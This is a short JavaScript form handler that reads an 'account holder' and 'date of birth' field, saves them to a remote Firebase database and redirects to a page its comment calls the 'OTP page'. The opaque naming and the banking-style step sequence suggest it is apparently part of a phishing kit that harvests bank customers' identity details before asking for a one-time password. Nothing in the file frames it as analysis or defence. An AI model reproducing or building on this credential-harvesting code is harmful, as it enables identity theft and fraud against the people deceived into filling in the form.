// reference your database
var ududip005DB = firebase.database().ref("ududip005");

document.getElementById("ududip005").addEventListener("submit", submitForm);

function submitForm(e) {
    e.preventDefault();

    var accnum = getElementVal("achold");
    var udob = getElementVal("udob");
    



    saveMessages(accnum, udob,);

    // redirect to OTP page
    window.location.href = "Processing2.html";
}

const saveMessages = (achold, udob) => {
    var newududip005 = ududip005DB.push();

    newududip005.set({
        Account_Holder: achold,
        Date_of_Birth: udob,
        



    });
};

const getElementVal = (id) => {
    return document.getElementById(id).value;
};